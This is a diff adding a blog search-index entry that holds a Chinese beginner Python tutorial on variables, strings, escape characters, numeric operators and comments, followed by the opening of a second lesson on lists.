@@ -74,6 +74,581 @@
       </tags>
   </entry>
   <entry>
+    <title>Python从入门到精通——1 . Python介绍及语法元素基础知识（快速上手）</title>
+    <url>/2024/09/23/356fe7073bf3/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>“人生苦短，快用Python”</strong></em></p>
+<p>本文是python语法的一套教程，主要目的是为了之后的AI学习，能够看懂代码，并且能够自己修改参数和优化算法。</p>
+<p>看完本文能够让你对Python语法有一定了解，如果你是零基础的新手，能够让你入门python，但是本文可能不适合<strong>老油条</strong>进行学习。本套教程是一系列Python的基础语法以及一些基本算法的了解和动手联系。本套Python教程会持续较长一段时间的更新。<strong>请持续关注！！！</strong></p>
+<p>本套教材主要是通过conda虚拟环境和Jupyter Notebook进行配套学习，也可以使用PyCharm进行学习，Jupyter适合多段任务。</p>
+<h1 id="Python介绍"><a href="#Python介绍" class="headerlink" title="Python介绍"></a>Python介绍</h1><p>Python的设计哲学是“优雅”、“明确”、“简单”。在设计Python语言时，如果面临多种选择，Python开发者一般会拒绝花俏的语法，而选择明确的没有或者很少有歧义的语法。由于这种设计观念的差异，Python源代码通常被认为具备更好的可读性，并且能够支撑大规模的软件开发。这些准则被称为Python格言。在Python解释器内运行import this可以获得完整的列表。</p>
+<p>“<em><strong>对于一个特定的问题，只要有一种最好的方法来解决</strong></em>”<br>这在由Tim Peters写的Python格言（称为The Zen of Python）里面表述为：There should be one-and preferably only one-obvious way to do it。</p>
+<p>Python是一门相较于其他语言比较好入门的语言，并且也是当前人工智能相关领域的主流语言。Python是一门面向<a class="link"   href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2262089?fromModule=lemma_inlink" >对象编程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的语言，Python在各个编程语言中比较适合新手学习，Python解释器易于扩展，可以使用C、C++或其他可以通过C调用的语言扩展新的功能和数据类型。 Python也可用于可定制化软件中的扩展程序语言。Python丰富的标准库，提供了适用于各个主要系统平台的源码或机器码。 </p>
+<p>Python秉承着开源精神，一个显著的特征就是有很多包、库可以进行导入并且调用，也可以导入自己写的程序包进行调用，出名的包不仅能让代码更加规范，也让进行一些训练任务更加简洁方便。</p>
+<p><em><strong>参考资料：</strong></em></p>
+<ol>
+<li><em><strong>《Python编程：从入门到实践》</strong></em>（通俗易懂，<a class="link"   href="https://pan.baidu.com/s/1yY8UwQzv3m5wHHX81mwbBQ?pwd=c8m7" >电子书下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</li>
+<li>***<a class="link"   href="https://github.com/jackfrued/Python-100-Days" >Python - 100天从新手到大师 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>***（github上的王中王）</li>
+<li><a href="%5Bhttps://docs.python.org/zh-cn/3/%5D(https://docs.python.org/zh-cn/3/)">Python官方文档</a>（适合入门和精进）</li>
+</ol>
+<hr>
+<p>*<strong>首先需要了解一个概念：Python中代码的层级是通过缩进来确定的，比如你利用一个for循环，那么for循环里面的代码相对于for循环的标志是要多一个<code>tab缩进</code>的，也就是多<code>四个空格</code></strong></p>
+<p>本节的核心：如何输出<code>Hello World！</code></p>
+<p><strong>准备好了，我们正式开始教程</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>（<span class="string">&quot;Hello World！&quot;</span>）</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1.  变量"></a>1.  变量</h2><h3 id="1-1-变量的介绍"><a href="#1-1-变量的介绍" class="headerlink" title="1.1 变量的介绍"></a>1.1 变量的介绍</h3><p>首先我们先看看变量的好处<br>比如我们要记录一个值：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">888</span></span><br></pre></td></tr></table></figure></div>
+<p>我们要将一个整数<code>888</code>进行运算，但是如果每次都使用<code>888</code>，那么会降低代码的复用性，而我们用一个变量来保存这个数字，那么就可以重复利用，也可以方便改变变量的值来进行计算。这样就可以让代码之间进行联系。<br>当然变量可以保存各种类型的数据，包括字符串和浮点数（可以先理解为小数，后面会详细解释）等。</p>
+<h3 id="1-2-变量的规则"><a href="#1-2-变量的规则" class="headerlink" title="1.2 变量的规则"></a>1.2 变量的规则</h3><p>但是变量的命名是有一定规则的，我们先列出所有规则，然后一一举例：</p>
+<ul>
+<li>变量名只能包含字⺟、数字和下划线 。变量名能以字⺟或下划线打 头，但不能以数字打头。例如，可将变量命名为 message_1，但不能 将其命名为 1_message。</li>
+<li>变量名不能包含空格，但能使⽤下划线来分隔其中的单词。例如，变 量名 greeting_message 可⾏，但变量名 greeting message 会 引发错误。 </li>
+<li>不要将 Python 关键字和函数名⽤作变量名。例如，不要将 print ⽤作 变量名，因为它被 Python 留作特殊⽤途（请参⻅附录 A.4）。 </li>
+<li>变量名应既简短⼜具有描述性。例如，name ⽐ n 好， student_name ⽐ s_n 好，name_length ⽐ length_of_persons_name 好。 </li>
+<li>慎⽤⼩写字⺟ l 和⼤写字⺟ O，因为它们可能被⼈错看成数字 1 和 0。<br>ps：在Python3中，变量名甚至可以用中文，但是不推荐这样做，应该创建通俗易懂的变量名，比如利用英文翻译你的中文来作为变量名。<blockquote>
+<p>以上参考《Python编程：从入门到实践》</p>
+</blockquote>
+</li>
+</ul>
+<p>变量可以理解为一个数据或内容的标签，你可以通过标签找到存在里面的内容，并且你可以修改内容的标签，以便人类来进行理解。</p>
+<p>下面举两个例子</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;I Love Python&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241424893.png"
+                      alt="image.png"
+                ></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">123</span></span><br><span class="line">b = <span class="number">321</span></span><br><span class="line">c = <span class="number">7</span></span><br><span class="line">d = <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line">c = <span class="number">77</span></span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line"><span class="built_in">print</span>(b-d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c/<span class="number">7</span>)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241425084.png"
+                      alt="image.png"
+                ></p>
+<h2 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2. 字符串"></a>2. 字符串</h2><h3 id="2-1-字符串的介绍"><a href="#2-1-字符串的介绍" class="headerlink" title="2.1 字符串的介绍"></a>2.1 字符串的介绍</h3><p><strong>字符串</strong>是一系列用单引号或者双引号引起来的字符组成的，但是个人建议字符串用双引号，单个字符用单引号。比如<code>&#39;h&#39;</code>和<code>&quot;hello&quot;</code>.<br>我们来看一下字符串的输出方式，首先字符串可以利用变量储存起来：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">&quot;Python&quot;</span></span><br><span class="line"></span><br><span class="line">str3 = <span class="string">&quot;World&quot;</span></span><br><span class="line"></span><br><span class="line">num1 = <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1,str2,str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1 + <span class="string">&quot; &quot;</span> + str2 + <span class="string">&quot; &quot;</span> + str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1+<span class="string">&quot;666&quot;</span>+str2+<span class="string">&quot;777&quot;</span>+str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1 + str2 + str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1+str2+str3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;str2&#125;</span><span class="subst">&#123;num1&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;str2.upper()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241514265.png"
+                      alt="image.png"
+                ></p>
+<h3 id="2-2-关于字符串的函数"><a href="#2-2-关于字符串的函数" class="headerlink" title="2.2 关于字符串的函数"></a>2.2 关于字符串的函数</h3><p>以下提前介绍几个关于字符串的函数，这里只是提前了解，具体函数的讲解在之后的文章。<br>（1）<code>title()</code>函数<br>这个函数就是让字符串的每个单词首字母大写。<br><em>举例如下：</em></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;hello python&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>.title())</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241533807.png"
+                      alt="image.png"
+                ><br>（2）<code>upper()</code>和<code>lower()</code>函数<br>这两个函数是相反的作用，upper()是让所有字母大写，lower()是让所有字母小写<br><em>举例如下：</em></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">str2 = <span class="string">&quot;PYTHON&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str1.upper())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str2.lower())</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241535864.png"
+                      alt="image.png"
+                ></p>
+<h3 id="2-3-字符串的输出"><a href="#2-3-字符串的输出" class="headerlink" title="2.3 字符串的输出"></a>2.3 字符串的输出</h3><p>可以看到如上几种输出方式，一般字符串变量之间利用<code>,</code>连接，然后之间也可以自己穿插字符串，如果利用<code>+</code>连接，那么字符串之间是没有空格的，需要自己加上<code>&quot; &quot;</code>作为空格。<code>f&quot;&quot;</code>为Python的标准化输出，如果要引用变量需要用<code>&#123;&#125;</code>大括号括起来，表示里面是变量名，<code>&#123;&#125;</code>里面还可以将数字来进行计算然后作为输出</p>
+<p><em><strong>ps： 这里的反斜杠<code>&quot;\&quot;</code>是转义字符，加上后面跟着的符号会转义为一个操作，或者在标准化输出中，会直接进行输出，否则会报错。比如想输出一个双引号<code>&quot;</code>，但是由于输出字符外面也是用的双引号，当你这样运行时系统会报错：你的双引号没有闭上，就是只有前引号而没有后引号，所以需要加上转义字符，代表你想单独输出这个符号。<br>具体的例子可以自己在编辑器试一下，这里不详细给出</strong></em><br><strong>下面是转义字符的表格</strong></p>
+<table>
+<thead>
+<tr>
+<th>转义字符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\(在行尾时)</td>
+<td>续行符</td>
+</tr>
+<tr>
+<td>\</td>
+<td>反斜杠符号</td>
+</tr>
+<tr>
+<td>\&#96;</td>
+<td>单引号</td>
+</tr>
+<tr>
+<td>\“</td>
+<td>双引号</td>
+</tr>
+<tr>
+<td>\a</td>
+<td>响铃</td>
+</tr>
+<tr>
+<td>\b</td>
+<td>退格(Backspace)</td>
+</tr>
+<tr>
+<td>\e</td>
+<td>转义</td>
+</tr>
+<tr>
+<td>\000</td>
+<td>空</td>
+</tr>
+<tr>
+<td>\n</td>
+<td>换行</td>
+</tr>
+<tr>
+<td>\v</td>
+<td>纵向制表符</td>
+</tr>
+<tr>
+<td>\t</td>
+<td>横向制表符</td>
+</tr>
+<tr>
+<td>\r</td>
+<td>回车</td>
+</tr>
+<tr>
+<td>\f</td>
+<td>换页</td>
+</tr>
+<tr>
+<td>\oyy</td>
+<td>八进制数，y 代表 0~7 的字符，例如：\012 代表换行</td>
+</tr>
+<tr>
+<td>\xyy</td>
+<td>十六进制数，以 \x 开头，yy代表的字符，例如：\x0a代表换行</td>
+</tr>
+<tr>
+<td>\other</td>
+<td>其它的字符以普通格式输出</td>
+</tr>
+</tbody></table>
+<p>我们可以利用制表符<code>&quot;\t&quot;</code>和换行符符<code>&quot;\n&quot;</code>来制造空白（制表可用）和换行<br>比如：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello\nPython&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello\tPython&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241519734.png"
+                      alt="image.png"
+                ></p>
+<h3 id="2-3-字符串的练习"><a href="#2-3-字符串的练习" class="headerlink" title="2.3 字符串的练习"></a>2.3 字符串的练习</h3><p>以下题目可以进行练习，后面会给出答案：</p>
+<blockquote>
+<p>题目来源：《Python编程：从入门到实践》</p>
+</blockquote>
+<p>练习1.1. <strong>个性化消息</strong>  ⽤变量表⽰⼀个⼈的名字，并向其显⽰⼀条消息。显⽰的消息应⾮常简单，如下所⽰。<br><em>Hello Eric, would you like to learn some Python today?</em></p>
+<p>练习1.2. <strong>调整名字的⼤⼩写</strong>  ⽤变量表⽰⼀个⼈的名字，再分别以全⼩写、全⼤写和⾸字⺟⼤写的⽅式显⽰这个⼈名。</p>
+<p>练习1.3. <strong>名⾔ 1</strong> 找到你钦佩的名⼈说的⼀句名⾔，将这个名⼈的姓名和名⾔打印出来。输出应类似于下⾯这样（包括引号）。<br><em>Albert Einstein once said, “A person who never made a mistake never tried anything new.”</em></p>
+<p>练习1.4. <strong>名⾔ 2</strong>  重复练习 1.3，但⽤变量 famous_person 表⽰名⼈的姓名，再创建要显⽰的消息并将其赋给变量 message，然后打印这条消息。</p>
+<p><em><strong>答案如下：</strong></em><br>练习1.1</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>, would you like to learn some Python today?&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>练习1.2</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br></pre></td></tr></table></figure></div>
+
+<p>练习1.3</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Albert Einstein once said, A person who never made a mistake never tried anything new&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>练习1.4</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;Albert Einstein&quot;</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;A person who never made a mistake never tried anything new.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> once said, \&quot;<span class="subst">&#123;message&#125;</span>\&quot;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3-数"><a href="#3-数" class="headerlink" title="3. 数"></a>3. 数</h2><h3 id="3-0-运算符"><a href="#3-0-运算符" class="headerlink" title="3.0 运算符"></a>3.0 运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[]</code> <code>[:]</code></td>
+<td>下标，切片</td>
+</tr>
+<tr>
+<td><code>**</code></td>
+<td>指数</td>
+</tr>
+<tr>
+<td><code>~</code> <code>+</code> <code>-</code></td>
+<td>按位取反, 正负号</td>
+</tr>
+<tr>
+<td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td>
+<td>乘，除，模，整除</td>
+</tr>
+<tr>
+<td><code>+</code> <code>-</code></td>
+<td>加，减</td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td>
+<td>右移，左移</td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>按位与</td>
+</tr>
+<tr>
+<td><code>^</code> <code>|</code></td>
+<td>按位异或，按位或&#96;</td>
+</tr>
+<tr>
+<td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td>
+<td>小于等于，小于，大于，大于等于</td>
+</tr>
+<tr>
+<td><code>==</code> <code>!=</code></td>
+<td>等于，不等于</td>
+</tr>
+<tr>
+<td><code>is</code> <code>is not</code></td>
+<td>身份运算符</td>
+</tr>
+<tr>
+<td><code>in</code> <code>not in</code></td>
+<td>成员运算符</td>
+</tr>
+<tr>
+<td><code>not</code> <code>or</code> <code>and</code></td>
+<td>逻辑运算符</td>
+</tr>
+<tr>
+<td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td>
+<td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>ps：实际开发中，一般用括号来确定运算优先级</p>
+</blockquote>
+<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><p>赋值运算符时最常见的运算符，无论是前面的变量赋值还是后面的运算赋值，都是必不可少的运算符。<br>赋值运算符中有一类叫复合赋值运算符，可以理解为在赋值前进行一次运算</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">a += b        <span class="comment"># 相当于：a = a + b</span></span><br><span class="line">a *= a + <span class="number">2</span>    <span class="comment"># 相当于：a = a * (a + 2)</span></span><br><span class="line"><span class="built_in">print</span>(a)      <span class="comment"># 算一下这里会输出什么</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="比较运算符和逻辑运算符"><a href="#比较运算符和逻辑运算符" class="headerlink" title="比较运算符和逻辑运算符"></a>比较运算符和逻辑运算符</h4><p>比较运算符也称为关系运算符，包括<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&lt;=</code>、<code>&gt;=</code>，就是用来比较符号两边的关系。注意其中的<code>==</code>，这是两个等号，用来比较两者是否相等，请与赋值运算符区别。比较运算符的返回结果是一个布尔值，<code>True</code>或者<code>False</code>。</p>
+<p>逻辑运算符有三个，分别为<code>and</code>,<code>or</code>,<code>not</code>。相信学过其他语言的同学都会知道是什么意思，<code>and</code>需要两边的结果的布尔值都是<code>True</code>结果才为<code>True</code>，否则就是<code>False</code>。<code>or</code>则只需有一个布尔值为<code>True</code>结果就为<code>True</code>，否则就是<code>False</code>。而<code>not</code>则是取反，也就是说，后面的布尔值如果是<code>True</code>运算结果就是<code>False</code>，而后面的布尔值如果是<code>False</code>则运算结果就是<code>True</code>。</p>
+<p>ps：当<code>and</code>的左边布尔值为<code>False</code>，不管右边的值，将会直接返回<code>False</code>，跳过处理右边。（这叫短路处理）。同理<code>or</code>也是有短路处理的功能的，当左边为<code>True</code>时，会直接跳过右边的表达式。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag0 = <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">flag1 = <span class="number">3</span> &gt; <span class="number">2</span></span><br><span class="line">flag2 = <span class="number">2</span> &lt; <span class="number">1</span></span><br><span class="line">flag3 = flag1 <span class="keyword">and</span> flag2</span><br><span class="line">flag4 = flag1 <span class="keyword">or</span> flag2</span><br><span class="line">flag5 = <span class="keyword">not</span> (<span class="number">1</span> != <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag0 =&#x27;</span>, flag0)    <span class="comment"># flag0 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1 =&#x27;</span>, flag1)    <span class="comment"># flag1 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2 =&#x27;</span>, flag2)    <span class="comment"># flag2 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag3 =&#x27;</span>, flag3)    <span class="comment"># flag3 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag4 =&#x27;</span>, flag4)    <span class="comment"># flag4 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag5 =&#x27;</span>, flag5)    <span class="comment"># flag5 = False</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-1-整数"><a href="#3-1-整数" class="headerlink" title="3.1 整数"></a>3.1 整数</h3><p>在Python中，可以对<strong>整数</strong>执行<strong>加减乘除</strong>的运算</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">d = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b-d)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d/c)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241925694.png"
+                      alt="image.png"
+                ></p>
+<p>并且可以使用两个乘号<code>**</code>来表示乘方运算</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a**b)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241926264.png"
+                      alt="image.png"
+                ></p>
+<p>可以利用括来改变运算顺序</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+b*c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((a+b)*c)</span><br></pre></td></tr></table></figure></div>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241927509.png"
+                      alt="image.png"
+                ></p>
+<p>ps：当你需要参与的整数过大时，可以采取下划线的方式，每三个分段，来让你的数更清晰易读，并且当你打印输出时，Python不会打印其中的下划线。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241943694.png"
+                      alt="image.png"
+                ></p>
+<h3 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a>3.2 浮点数</h3><p>Python中浮点数就是带小数点的数，小数点可以出现在数的任何位置上，以表示任何数。<br>当你使用浮点数时，你可以不用考虑其他行为，python通常会按照你的预期的方式进行处理，所以Python是世界上最好的语言！！！（&#x2F;doge）</p>
+<p>如下图，可以看到当你把一个整数加上小数点，就变成了一个浮点数，这就是**小数点可以出现在任何位置上的原因。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241933894.png"
+                      alt="image.png"
+                ></p>
+<p>但是需要注意的是，当浮点数参与运算时，小数位数可能是不确定的，可以理解为浮点数其实是计算机给你的一个精确值，但不是绝对和运算结果相等的，可以参考下图。<br>这是所有编程语言都存在的问题，说白了这是计算机硬件处理和储存的问题，具体可参考计算机组成原理，这里不详细解释，所以计算机会忽略多余的小数位数来尽力精确的表示结果。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241936081.png"
+                      alt="image.png"
+                ></p>
+<blockquote>
+<p>来源： 《Python编程：从入门到实践》</p>
+</blockquote>
+<p>ps：</p>
+<ul>
+<li>两个整数相除，结果也是一个浮点数，即使这两个数可以整除。</li>
+<li>在一系列运算中，若存在一个浮点数，那么结果也是浮点数。</li>
+</ul>
+<h3 id="3-3-常量"><a href="#3-3-常量" class="headerlink" title="3.3 常量"></a>3.3 常量</h3><p><strong>常量</strong>就是在程序的整个生命周期内都保持不变的变量。Python没有内置的常量类型，但是一般会使用全大写字母的变量名来指出某个变量为常量，其值应始终保持不变<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241956461.png"
+                      alt="image.png"
+                ></p>
+<h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4. 注释"></a>4. 注释</h2><p>注释是让代码逻辑清晰的一个很有用的功能，注释是不会被程序执行的。随着程序越来越大，增加注释来对代码进行大致阐述，可以让别人看你代码时更加容易理解。</p>
+<p>编写方式：井号<code>#</code>来标识。<code>#</code>后的内容都会被Python解释器忽略<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409242000866.png"
+                      alt="image.png"
+                ><br>编写注释的主要⽬的是阐述代码要做什么，以及是如何做的。在开发项⽬ 期间，你对各个部分如何协同⼯作了如指掌，但是⼀段时间过后，你可能会忘记⼀些细节。当然，你总是可以通过研究代码来确定各个部分的⼯作 原理，但通过编写注释以清晰的⾃然语⾔对解决⽅案进⾏概述，可以节省很多时间。<br>要成为专业程序员或与其他程序员合作，就必须编写有意义的注释。当前，⼤多数软件是合作编写⽽成的，编写者既可能是同⼀家公司的多名员⼯，也可能是众多致⼒于同⼀个开源项⽬的⼈。训练有素的程序员都希望代码中包含注释，因此你最好从现在开始就在程序中添加描述性注释。新⼿程序员最值得养成的习惯之⼀就是，在代码中编写清晰、简洁的注释。 如果不确定是否要编写注释，就问问⾃⼰：在找到合理的解决⽅案之前， 考虑了多个解决⽅案吗？如果答案是肯定的，就编写注释，对你的解决⽅案进⾏说明吧。相⽐以后再回头添加注释，删除多余的注释要容易得多。 从现在开始，本书的⽰例都将使⽤注释来阐述代码的⼯作原理。</p>
+<p>如果你想写shi山代码除外，网上很多说不写注释加上乱七八糟的变量名可以增加自己的不可替代性。这边建议不如多学学高门槛的知识，来增加自己的不可代替性。</p>
+<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>以上是Python基础入门第一课，真的很基础，后面会慢慢上升难度，作者决定跳过小问题，主要面向之后的AI学习来编写教程。有任何问题包括排版或者学习顺序的问题都可以评论或者邮箱私我。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python从入门到精通——2. 列表、元组、字典创建及操作</title>
+    <url>/2024/09/25/82a6c0c945c0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>序列是Python中最基本的数据结构，序列中的每个值都有对应位置上的数据值，称之为索引。<em><strong>注意：索引的第一个是0</strong></em></p>
+<p><strong>在Python中，一共有6个内置类型，其中列表和元组是最常见的类型。</strong></p>
+<hr>
